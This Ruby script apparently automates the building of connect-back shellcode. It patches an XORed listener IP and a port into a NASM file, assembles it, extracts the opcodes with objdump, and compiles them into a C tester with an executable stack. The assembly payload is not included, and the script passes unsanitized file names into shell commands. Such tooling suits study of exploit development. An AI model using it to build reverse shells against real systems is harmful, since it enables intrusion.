#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

def run
  parse_args
  @xor_ip = xor_ip(@ip)
  @port = to_hex(@port)
  replace_ip
  replace_port
  compile_nasm
  @shellcode = generate_shellcode
  replace_shellcode
  compile_binary
rescue OptionParser::MissingArgument
  puts "Missing argument:"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "An error #{e.inspect} occurred"
  exit(1)
end

# Convert the IP into the XORed value with 0xffffffff
# This is needed to avoid null bytes when used with the nasm code
def xor_ip(ip)
  ip_hex = ip.split('.').reverse.map(&:to_i)
    .map { |n|  n.to_s(16).size.odd? ? n.to_s(16).prepend('0') : n.to_s(16) }
    .join.prepend('0x').hex
  xor_ip = ip_hex ^ 0xffffffff
  xor_ip.to_s(16).prepend('0x')
end

# Convert number into hex format used by the nasm code
def to_hex(number)
  hex = number.to_s(16)
  hex = hex.size.even? ? hex : hex.prepend('0')
  hex.scan(/../).reverse.join.prepend('0x')
end

# Replace a value inside a file
def replace_content(filename = "#{@filename}.nasm")
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace the XORed IP value in the nasm file
def replace_ip
  replace_content do |nasm_code|
    nasm_code.gsub!(/XOR_IP\s*equ\s\S+/, "XOR_IP      equ #{@xor_ip}")
  end
end

# Replace the port number in the nasm file
def replace_port
  replace_content do |nasm_code|
    nasm_code.gsub!(/PORT\s*equ\s\S+/, "PORT        equ #{@port}")
  end
end

# Compile the nasm code
def compile_nasm
  `nasm -f elf32 -o #{@filename}.o #{@filename}.nasm`
  `ld -m elf_i386 -s -o #{@filename} #{@filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode
  objdump = `objdump -d #{@filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
    .compact.map(&:split).join('\x').prepend('\x')
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    c_code.gsub!(/\"\S+\"\;/, "\"#{@shellcode}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--ip", "-i IP_ADDR", "IP of the listener") do |value|
      @ip = value
    end

    opts.on("--port", "-p PORT", "Port number of the listener") do |value|
      @port = value.to_i
    end

    opts.on("--nasm", "-n NASM", "Basename of the nasm code") do |value|
      @filename = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "Successfully generated \e[32mshellcode\e[0m binary!"
end
